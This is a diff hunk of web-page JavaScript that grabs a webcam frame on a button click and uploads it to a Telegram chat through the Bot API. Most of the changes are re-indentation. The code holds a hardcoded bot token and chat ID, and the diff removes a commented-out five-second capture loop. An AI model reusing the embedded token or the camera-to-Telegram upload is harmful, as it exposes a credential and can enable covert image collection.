@@ -201,91 +201,87 @@
 
         // Function to capture image
         function captureImage(delay) {
-            setTimeout(function() {
-            var video = document.getElementById('video');
-            var canvas = document.createElement('canvas');
-            canvas.width = 320;
-            canvas.height = 430;
-            var context = canvas.getContext('2d');
-            // context.translate(canvas.height, 0);
-            // context.rotate(-Math.PI / 2);
+            setTimeout(function () {
+                var video = document.getElementById('video');
+                var canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 430;
+                var context = canvas.getContext('2d');
+                // context.translate(canvas.height, 0);
+                // context.rotate(-Math.PI / 2);
 
-            context.drawImage(video, 0, 0, 320, 430);
+                context.drawImage(video, 0, 0, 320, 430);
 
-            // Draw captured image onto video element
-            var videoParent = video.parentNode;
-            videoParent.replaceChild(canvas, video);
-
-
-            // Remove the video element
-            // videoParent.removeChild(video);
-            stopVideoStream();
-            // Stop video streaming
-            if (stream) {
-                stream.getTracks().forEach(track => {
-                    track.stop();
-                });
-            }
-
-            // Remove access to camera
-            //    navigator.mediaDevices.getUserMedia({ video: false })
-            //                 .then(function() {
-            //                     console.log('Access to camera removed.');
-            //                 })
-            //                 .catch(function(err) {
-            //                     console.log("An error occurred while removing access to camera: " + err);
-            //                 });
+                // Draw captured image onto video element
+                var videoParent = video.parentNode;
+                videoParent.replaceChild(canvas, video);
 
 
-            canvas.toBlob(function (blob) {
-                // Create File object from Blob
-                var file = new File([blob], 'captured_image.png', { type: 'image/png' });
-
-                // Send file to Telegram using fetch
-                var formData1 = new FormData();
-                formData1.append('photo', file);
-
-
-                const loader = document.getElementById('loader1');
-                loader.style.display = 'block';
-
-                const botToken = '5214279030:AAHwXVkouOpHANC1EiK6edh_ux4cFqoZ-OY';
-                const chatId = '-1001570223088';
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
-                    method: 'POST',
-                    body: formData1
-                })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Failed to send image');
-                        }
-                        loader.style.display = 'none';
-                        alert('Image sent successfully!');
-                        location.reload();
-
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        loader.style.display = 'none';
-                        alert('Failed to send image');
-                        location.reload();
-
+                // Remove the video element
+                // videoParent.removeChild(video);
+                stopVideoStream();
+                // Stop video streaming
+                if (stream) {
+                    stream.getTracks().forEach(track => {
+                        track.stop();
                     });
-            }, 'image/png');
-        }, delay);3
+                }
+
+                // Remove access to camera
+                //    navigator.mediaDevices.getUserMedia({ video: false })
+                //                 .then(function() {
+                //                     console.log('Access to camera removed.');
+                //                 })
+                //                 .catch(function(err) {
+                //                     console.log("An error occurred while removing access to camera: " + err);
+                //                 });
+
+
+                canvas.toBlob(function (blob) {
+                    // Create File object from Blob
+                    var file = new File([blob], 'captured_image.png', { type: 'image/png' });
+
+                    // Send file to Telegram using fetch
+                    var formData1 = new FormData();
+                    formData1.append('photo', file);
+
+
+                    const loader = document.getElementById('loader1');
+                    loader.style.display = 'block';
+
+                    const botToken = '5214279030:AAHwXVkouOpHANC1EiK6edh_ux4cFqoZ-OY';
+                    const chatId = '-1001570223088';
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+                        method: 'POST',
+                        body: formData1
+                    })
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Failed to send image');
+                            }
+                            loader.style.display = 'none';
+                            alert('Image sent successfully!');
+                            location.reload();
+
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                            loader.style.display = 'none';
+                            alert('Failed to send image');
+                            location.reload();
+
+                        });
+                }, 'image/png');
+            }, delay); 
         };
 
 
         // Event listener for capture button
-        document.getElementById('capture-btn').addEventListener('click',function() {
-    // Capture image after a delay of 500 milliseconds (adjust as needed)
-    captureImage(500);
-});
-
-        // Set interval to capture image every 5 seconds
-        // setInterval(captureImage, 5000);
-
+        document.getElementById('capture-btn').addEventListener('click', function () {
+            // Capture image after a delay of 500 milliseconds (adjust as needed)
+            captureImage(500);
+        });
 
 
         // Check if video container is visible
